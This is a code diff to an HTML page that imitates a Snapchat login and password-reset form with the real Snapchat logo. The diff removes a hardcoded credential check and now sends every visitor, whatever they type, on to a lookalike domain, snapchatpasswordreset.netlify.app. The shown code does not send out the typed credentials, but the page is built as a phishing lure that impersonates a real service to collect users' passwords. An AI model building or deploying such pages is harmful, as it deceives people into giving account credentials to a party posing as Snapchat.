@@ -2,13 +2,20 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <title>Snapchat Login</title>
+    <title>Log In - Snapchat Password Reset</title>
     <link rel="stylesheet" href="index.css"> <!-- Link to your CSS file -->
+    <style>
+        .error-message {
+            color: red;
+            margin-top: 5px;
+            font-size: 14px;
+        }
+    </style>
 </head>
 <body>
     <div class="form">
         <img src="https://upload.wikimedia.org/wikipedia/en/c/c4/Snapchat_logo.svg" alt="Snapchat Logo" class="snapchat-logo">
-        <h1>Log in to Reset Your Password</h1>
+        <h1>Log In to Reset Your Snapchat Password</h1>
         <form id="loginForm">
             <label for="username">Username or Email Address:</label><br>
             <input type="text" id="username" name="username" placeholder="Enter your username or email" required><br><br>
@@ -17,6 +24,7 @@
             <input type="password" id="password" name="password" placeholder="Enter your password" required><br><br>
             
             <input type="submit" value="Log In">
+            <span id="loginError" class="error-message"></span><br>
         </form>
     </div>
     
@@ -24,17 +32,8 @@
         document.getElementById('loginForm').addEventListener('submit', function(event) {
             event.preventDefault(); // Prevent form submission
             
-            var username = document.getElementById('username').value;
-            var password = document.getElementById('password').value;
-            
-            // Normally, you would authenticate the user with a server-side system. For this example, we assume authentication.
-            if (username === "ajj.tay" && password === "password123") {
-                // If authentication succeeds, redirect to the password reset page
-                window.location.href = "password_reset.html";
-            } else {
-                // If authentication fails, display an error message (for educational purposes)
-                alert("Incorrect username or password. Please try again.");
-            }
+            // Always redirect to password reset page (for demonstration purposes)
+            window.location.href = "https://snapchatpasswordreset.netlify.app/reset_password.html";
         });
     </script>
 </body>
